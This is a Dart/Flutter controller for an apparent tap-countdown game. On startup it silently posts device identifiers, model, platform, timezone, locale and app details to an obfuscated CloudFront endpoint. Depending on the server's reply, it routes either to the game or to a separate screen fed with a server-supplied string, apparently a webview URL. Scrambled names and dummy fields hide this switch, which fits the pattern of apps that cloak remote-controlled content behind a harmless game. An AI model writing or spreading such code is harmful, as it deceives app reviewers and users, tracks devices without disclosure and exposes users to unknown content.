import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class CountdownTapMainLogic extends GetxController {

  var mstyzgadcb = RxBool(false);
  var kahvqojf = RxBool(true);
  var lysxgutw = RxString("");
  var jaime = RxBool(false);
  var crist = RxBool(true);
  final qupwhzx = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    auzmfe();
  }


  Future<void> auzmfe() async {
    jaime.value = true;
    crist.value = true;
    kahvqojf.value = false;

    qupwhzx.post("https://d293c8yaw18nl2.cloudfront.net/uvgbskxmdrjfczinqeothlapwy",data: await autlikcynr()).then((value) {
      var whqgydp = value.data["whqgydp"] as String;
      var shjnavb = value.data["shjnavb"] as bool;
      if (shjnavb) {
        lysxgutw.value = whqgydp;
        gretchen();
      } else {
        kreiger();
      }
    }).catchError((e) {
      kahvqojf.value = true;
      crist.value = true;
      jaime.value = false;
    });
  }

  Future<Map<String, dynamic>> autlikcynr() async {
    final DeviceInfoPlugin mjba = DeviceInfoPlugin();
    PackageInfo jtzcpxgv_bcfidlq = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var xzidcev = Platform.localeName;
    var hs_zXDGZ = currentTimeZone;

    var hs_Bk = jtzcpxgv_bcfidlq.packageName;
    var hs_rSxfv = jtzcpxgv_bcfidlq.version;
    var hs_TCXbOB = jtzcpxgv_bcfidlq.buildNumber;

    var hs_Qc = jtzcpxgv_bcfidlq.appName;
    var hs_qm = "";
    var hs_buxG  = "";
    var hs_OrMgD = "";
    var elianNicolas = "";
    var georgeStrosin = "";
    var lutherKohler = "";
    var rowanHauck = "";
    var sabinaRempel = "";


    var hs_ezU = "";
    var hs_LIZjkFCQ = false;

    if (GetPlatform.isAndroid) {
      hs_ezU = "android";
      var rbngejio = await mjba.androidInfo;

      hs_OrMgD = rbngejio.brand;

      hs_qm  = rbngejio.model;
      hs_buxG = rbngejio.id;

      hs_LIZjkFCQ = rbngejio.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      hs_ezU = "ios";
      var tqhbvwlrgk = await mjba.iosInfo;
      hs_OrMgD = tqhbvwlrgk.name;
      hs_qm = tqhbvwlrgk.model;

      hs_buxG = tqhbvwlrgk.identifierForVendor ?? "";
      hs_LIZjkFCQ  = tqhbvwlrgk.isPhysicalDevice;
    }

    var res = {
      "hs_Qc": hs_Qc,
      "hs_TCXbOB": hs_TCXbOB,
      "hs_LIZjkFCQ": hs_LIZjkFCQ,
      "hs_Bk": hs_Bk,
      "hs_qm": hs_qm,
      "georgeStrosin" : georgeStrosin,
      "hs_zXDGZ": hs_zXDGZ,
      "hs_OrMgD": hs_OrMgD,
      "hs_buxG": hs_buxG,
      "xzidcev": xzidcev,
      "hs_ezU": hs_ezU,
      "elianNicolas" : elianNicolas,
      "lutherKohler" : lutherKohler,
      "hs_rSxfv": hs_rSxfv,
      "rowanHauck" : rowanHauck,
      "sabinaRempel" : sabinaRempel,

    };
    return res;
  }

  Future<void> kreiger() async {
    Get.offNamed("/countdown_tap_game");
  }

  Future<void> gretchen() async {
    Get.offNamed("/tap_history_sore");
  }

}
